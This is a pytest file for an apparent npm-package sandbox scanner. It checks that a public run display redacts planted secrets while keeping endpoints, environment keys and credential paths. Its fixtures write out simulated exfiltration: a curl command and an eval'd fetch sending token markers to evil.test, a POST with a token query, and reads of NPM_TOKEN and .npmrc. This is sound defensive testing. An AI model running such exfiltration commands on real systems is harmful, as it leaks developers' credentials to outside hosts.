# CLASS MAP — run_display: what a sealed run may say on a PUBLIC wire.
# Unit: project_run_display / observations_for / sanitize_setup /
#       sanitize_experiment over sealed RunArtifacts (pure; no IO, no sandbox).
#
# `/audit/:id` is a pasteable link and a package under test reads whatever the
# sandbox hands it, so the expensive half of this file is the NEGATIVE direction:
# asserting that an exfil is NAMED says nothing about the payload being left
# behind. Every content channel a run has is planted with a marker string and the
# whole projection is searched for it — one test per channel would pass while a
# new channel leaked.
#
# Four facts these classes turn on:
#
#  - Identity is BORROWED. A DisplayObservation's eventId is the `eN` handle
#    `render_timeline` gave the row, so a judgment's citations resolve to the rows
#    the judge actually read. A second numbering would look right and address the
#    wrong events — the failure mode is a verdict pointing at the wrong evidence,
#    which is worse than no citation at all.
#  - The bound is over ROWS, not events, because a row is what a viewer sees.
#    `_collapse` merges consecutive identical rows, so 44 DNS packets are one row
#    with occurrences=44 — and `occurrences` is asserted, since a display that
#    drops it understates the run by 43 events.
#  - A citation OUTRANKS the bound. The judge has not run when sandbox_completed
#    is emitted, so `observations_for` must resolve an id the preview left out.
#    This is what makes "a confirmed verdict points at its evidence" total.
#  - Structural targets survive redaction. `POST localhost/exfil` is the
#    observation; `?token=…` is a payload spelled in a URL. Both are asserted, in
#    both directions.
#
# Axes: channel (buffer / body / eval / script / argv / env value / url query) ×
#       signal (error / high / repeat-demoted / scenery) ×
#       bound (fits / truncates) × path (preview vs citation)
from __future__ import annotations

import pytest

from npmguard.contract.models import EvidenceEvent, ToolCall
from npmguard.evidence import (
    CANARY_PREFIX,
    compute_event_summary,
    mint_canary,
    render_timeline,
    seal_run_artifact,
)
from npmguard.run_display import (
    DISPLAY_OBSERVATION_BOUND,
    SYNTHETIC,
    observations_for,
    project_run_display,
    sanitize_experiment,
    sanitize_setup,
)

RUN_ID = "run_wire_identity"
# One marker per content channel. Distinct strings so a leak names its own source
# rather than leaving the reader to guess which channel opened.
SECRET_BUFFER = "BUFFERLEAK-ghp-aaaaaaaaaaaa"
SECRET_BODY = "BODYLEAK-ghp-bbbbbbbbbbbb"
SECRET_EVAL = "EVALLEAK-ghp-cccccccccccc"
SECRET_SCRIPT = "SCRIPTLEAK-ghp-dddddddddddd"
SECRET_ARGV = "ARGVLEAK-ghp-eeeeeeeeeeee"
SECRET_ENV = "ENVLEAK-ghp-ffffffffffff"
SECRET_QUERY = "QUERYLEAK-ghp-gggggggggggg"
ALL_SECRETS = (
    SECRET_BUFFER,
    SECRET_BODY,
    SECRET_EVAL,
    SECRET_SCRIPT,
    SECRET_ARGV,
    SECRET_ENV,
    SECRET_QUERY,
)


def _event(kind: str, *, stream: str = "L4:monkey", at: int = 0, raw=None, **normalized):
    return EvidenceEvent(
        stream=stream, timestamp=at, pid=1, kind=kind, raw=raw, normalized=normalized
    )


def _artifact(events: list[EvidenceEvent], **changes):
    draft = {
        "runId": "run_sealed_identity",
        "triggerUsed": {"kind": "entrypoint", "target": "setup.js", "argv": [], "stdin": None},
        "setupApplied": {
            "env": {"NPM_TOKEN": SECRET_ENV, "HOME": "/home/node"},
            "plantFiles": [{"path": "/home/node/.npmrc", "contentHash": "a" * 64}],
            "stubUrls": [
                {"pattern": "http://evil.test/*", "responseHash": "b" * 64},
                {"pattern": "http://unused.test/*", "responseHash": None},
            ],
            "patches": [{"path": "lib/index.js", "patchHash": "c" * 64}],
            "preloadHash": "d" * 64,
        },
        "observe": {
            "kernel": True,
            "network": True,
            "fsDiff": True,
            "node": True,
            "inspector": True,
        },
        "budget": {"wallMs": 20000},
        "wallMs": 512.0,
        "exitCode": 0,
        "timedOut": False,
        "events": [event.model_dump(mode="json") for event in events],
        "eventSummary": compute_event_summary(events).model_dump(mode="json"),
        "error": None,
        "createdAt": "2026-07-26T00:00:00Z",
    }
    draft.update(changes)
    return seal_run_artifact(draft)


def _leaky_run():
    """One artifact carrying a distinct marker in every content channel a run has."""
    return _artifact(
        [
            _event("env_access", key="NPM_TOKEN", at=1),
            _event(
                "network",
                at=2,
                method="POST",
                url=f"http://evil.test/collect?token={SECRET_QUERY}",
                body=f'{{"npm":"{SECRET_BODY}"}}',
                bodyBytes=64,
            ),
            _event("eval", at=3, code=f'fetch("http://evil.test",{{body:"{SECRET_EVAL}"}})'),
            _event(
                "script_parsed",
                stream="L4:v8inspector",
                at=4,
                source=f"const t = '{SECRET_SCRIPT}';",
                len=40,
                url="eval-wrapper",
            ),
            _event("process", at=5, cmd=f"/usr/bin/curl -d {SECRET_ARGV} http://evil.test"),
            _event(
                "sendto",
                stream="L1:seccomp",
                at=6,
                raw=f'sendto(19, "{SECRET_BUFFER}", 27, 0, NULL, 0)',
                addr="203.0.113.9",
                port="443",
                ret="27",
            ),
            _event("openat", stream="L1:seccomp", at=7, path="/home/node/.npmrc", ret="7"),
        ]
    )


# --------------------------------------------------------------------------- #
# Identity
# --------------------------------------------------------------------------- #


def test_display_ids_are_the_ids_the_judge_cites() -> None:
    """C1: every observation's eventId is a row id `render_timeline` produced, so a
    citation and an observation address the same row. Two numberings would look
    identical here and point at different events in production."""
    artifact = _leaky_run()
    display = project_run_display(artifact, run_id=RUN_ID)
    assert {item.eventId for item in display.observations} <= render_timeline(artifact).ids


def test_the_wire_run_id_is_the_callers_not_the_artifacts() -> None:
    """C1b: the four experiment frames are joined by the id the orchestrator minted
    BEFORE the run. Reading it off the sealed artifact instead would leave
    `experiment_started` naming a run nothing else mentions."""
    display = project_run_display(_leaky_run(), run_id=RUN_ID)
    assert display.runId == RUN_ID
    assert display.contentHash and display.contentHash != RUN_ID


# --------------------------------------------------------------------------- #
# Redaction
# --------------------------------------------------------------------------- #


def test_no_content_channel_reaches_the_wire() -> None:
    """C2: the whole projection is searched for a marker planted in EVERY channel —
    strace buffer, request body, eval source, compiled script, argv, environment
    value, URL query. Asserted over the serialized payload rather than per field,
    because a new field is exactly how the next leak arrives."""
    payload = project_run_display(_leaky_run(), run_id=RUN_ID).model_dump_json()
    leaked = [secret for secret in ALL_SECRETS if secret in payload]
    assert leaked == []


def test_the_structural_target_survives_redaction() -> None:
    """C2b: redaction is not silence. The endpoint, the environment KEY and the
    credential path are the observation — dropping them to be safe would leave a
    viewer with a verdict and no way to check it."""
    summaries = " | ".join(
        item.summary for item in project_run_display(_leaky_run(), run_id=RUN_ID).observations
    )
    assert "evil.test" in summaries
    assert "NPM_TOKEN" in summaries
    assert ".npmrc" in summaries
    assert "203.0.113.9:443" in summaries


def test_a_url_keeps_its_path_and_loses_its_query() -> None:
    """C2c: `POST evil.test/collect` is where the data went; `?token=…` is the data.
    The row states that a query was present rather than dropping it silently."""
    display = project_run_display(_leaky_run(), run_id=RUN_ID)
    row = next(item for item in display.observations if item.kind == "network")
    assert "evil.test/collect" in row.summary
    assert SECRET_QUERY not in row.summary
    assert "?…" in row.summary


def test_dynamic_code_is_measured_not_quoted() -> None:
    """C2d: a package can compile anything at runtime, so eval source is the one
    channel with no safe excerpt. Its SIZE is the reportable fact."""
    display = project_run_display(_leaky_run(), run_id=RUN_ID)
    row = next(item for item in display.observations if item.kind == "eval")
    assert "characters compiled at runtime" in row.summary
    assert SECRET_EVAL not in row.summary


def test_a_payload_is_stated_as_size_and_correlation() -> None:
    """C2e: what left the process is reported by how much and whether it carried
    something the engine planted — never by its bytes."""
    canary = mint_canary()
    artifact = _artifact(
        [
            _event(
                "network",
                at=1,
                method="POST",
                url="http://evil.test/x",
                body=f'{{"t":"{canary}"}}',
                bodyBytes=128,
            )
        ],
        setupApplied={"env": {"NPM_TOKEN": f"npm_{canary}"}, "plantFiles": []},
    )
    row = next(
        item
        for item in project_run_display(artifact, run_id=RUN_ID).observations
        if item.kind == "network"
    )
    assert "128b payload" in row.summary
    assert "carries planted env NPM_TOKEN" in row.summary
    assert canary not in row.summary


# --------------------------------------------------------------------------- #
# Selection and the bound
# --------------------------------------------------------------------------- #


def _noise(count: int, *, at: int = 100) -> list[EvidenceEvent]:
    """Distinct scenery rows — distinct so `_collapse` cannot merge them away."""
    return [
        _event("openat", stream="L1:seccomp", at=at + index, path=f"/usr/lib/pad{index}.so")
        for index in range(count)
    ]


def test_the_bound_is_stated_exactly() -> None:
    """C3: a truncated display reports how many rows it left out. A display that
    quietly shortens reads as a complete one."""
    artifact = _artifact(_noise(DISPLAY_OBSERVATION_BOUND + 25))
    display = project_run_display(artifact, run_id=RUN_ID)
    total = len(render_timeline(artifact).ids)
    assert len(display.observations) == DISPLAY_OBSERVATION_BOUND
    assert display.omittedObservationCount == total - DISPLAY_OBSERVATION_BOUND


def test_an_error_row_survives_any_bound() -> None:
    """C3b: a run that broke or was cut short is the one fact a viewer must not have
    to infer from a shorter list, so truncation rows outrank everything."""
    artifact = _artifact(
        [
            *_noise(DISPLAY_OBSERVATION_BOUND + 40, at=10),
            _event("truncated", stream="engine", at=9_000, detail="wall-clock budget exceeded"),
        ]
    )
    display = project_run_display(artifact, run_id=RUN_ID, bound=5)
    assert any(item.signal == "error" for item in display.observations)
    assert display.omittedObservationCount > 0


def test_repeat_high_signal_behaviour_is_demoted_not_merged() -> None:
    """C3c: the FIRST `connect evil.test:443` is the finding; the ninth is scenery.
    Non-consecutive repeats cannot be collapsed, so the selection demotes them —
    otherwise one chatty loop fills the whole bound."""
    events = []
    for index in range(12):
        events.append(_event("connect", stream="L1:seccomp", at=index * 2, addr="1.2.3.4", port="443"))
        events.append(_event("openat", stream="L1:seccomp", at=index * 2 + 1, path=f"/tmp/x{index}"))
    display = project_run_display(_artifact(events), run_id=RUN_ID, bound=6)
    connects = [item for item in display.observations if item.kind == "connect"]
    assert [item.signal for item in connects].count("high") == 1


def test_a_collapsed_row_carries_its_true_count() -> None:
    """C3d: 44 identical packets are one row. Without `occurrences` the display
    shows one and understates the run by 43."""
    events = [
        _event("sendto", stream="L1:seccomp", at=index, raw='sendto(19, "x", 1, 0, NULL, 0)',
               addr="1.2.3.4", port="53", ret="1")
        for index in range(44)
    ]
    display = project_run_display(_artifact(events), run_id=RUN_ID)
    assert [item.occurrences for item in display.observations] == [44]


# --------------------------------------------------------------------------- #
# Citations
# --------------------------------------------------------------------------- #


def test_a_citation_resolves_even_when_the_preview_dropped_it() -> None:
    """C4: the judge has not run when `sandbox_completed` is emitted, so a cited row
    can be one the bound left out. This is the property that makes a confirmed
    verdict walkable back to its evidence in every case rather than most."""
    artifact = _artifact(_noise(DISPLAY_OBSERVATION_BOUND + 20))
    timeline = render_timeline(artifact)
    display = project_run_display(artifact, run_id=RUN_ID)
    dropped = sorted(
        timeline.ids - {item.eventId for item in display.observations},
        key=lambda value: int(value[1:]),
    )
    assert dropped, "the bound dropped nothing, so this proves nothing"
    cited = observations_for(artifact, dropped[:3])
    assert [item.eventId for item in cited] == dropped[:3]
    # And it resolves to the RIGHT row: the summary names what the judge's own
    # timeline line names at that id. A projection that merely returned three
    # observations would pass the equality above.
    for item in cited:
        line = next(
            row for row in timeline.text.splitlines() if row.startswith(f"{item.eventId} ")
        )
        assert item.summary.split()[-1] in line


def test_citations_are_redacted_on_the_same_terms() -> None:
    """C4b: the citation path is not a back door. Same projection, same rule."""
    artifact = _leaky_run()
    every = sorted(render_timeline(artifact).ids, key=lambda value: int(value[1:]))
    payload = str([item.model_dump() for item in observations_for(artifact, every)])
    assert [secret for secret in ALL_SECRETS if secret in payload] == []


def test_no_citation_yields_no_observations() -> None:
    """C4c: an empty citation list is not a request for everything."""
    assert observations_for(_leaky_run(), []) == []


# --------------------------------------------------------------------------- #
# Setup and experiment
# --------------------------------------------------------------------------- #


def test_setup_names_keys_and_drops_values() -> None:
    """C5: "we planted NPM_TOKEN and it left the process" is the whole point; the
    value is bait nobody needs to read off a public page."""
    setup = sanitize_setup(_leaky_run().setupApplied)
    assert setup.envKeys == ["HOME", "NPM_TOKEN"]
    assert SECRET_ENV not in str(setup.model_dump())
    assert setup.patchedFiles == ["lib/index.js"]
    assert setup.preloaded is True


def test_a_stub_reports_whether_it_was_ever_contacted() -> None:
    """C5b: "the endpoint you were told is stubbed was never contacted" is evidence
    about the run — the experiment's central manipulation never fired."""
    stubs = {stub.pattern: stub.served for stub in sanitize_setup(_leaky_run().setupApplied).stubUrls}
    assert stubs == {"http://evil.test/*": True, "http://unused.test/*": False}


def test_experiment_arguments_label_canaries_and_state_their_true_length() -> None:
    """C6: these strings are the ENGINE's and the model's — the plan, authored
    before anything ran — so the redaction is narrow. A minted canary becomes a
    label; a long authored blob is cut WITH its real size, because a silent cut
    reads as a short script."""
    canary = mint_canary()
    driver = "x" * 5_000
    [call] = sanitize_experiment(
        [ToolCall(tool="setEnv", args={"env": {"NPM_TOKEN": f"npm_{canary}"}, "driver": driver})]
    )
    rendered = str(call.args)
    assert CANARY_PREFIX not in rendered
    assert SYNTHETIC in rendered
    assert "(5000 characters)" in rendered


@pytest.mark.parametrize("field", ["stdoutHash", "stderrHash", "pcapHash", "straceLogHash"])
def test_capture_digests_are_carried_and_are_not_content(field: str) -> None:
    """C7: an inspector may state that a capture exists and name it. A hash is not
    content, and without it a viewer cannot tell "no network capture" from "we did
    not look"."""
    artifact = _artifact([_event("env_access", key="X")], **{field: "e" * 64})
    assert getattr(project_run_display(artifact, run_id=RUN_ID).captures, field) == "e" * 64
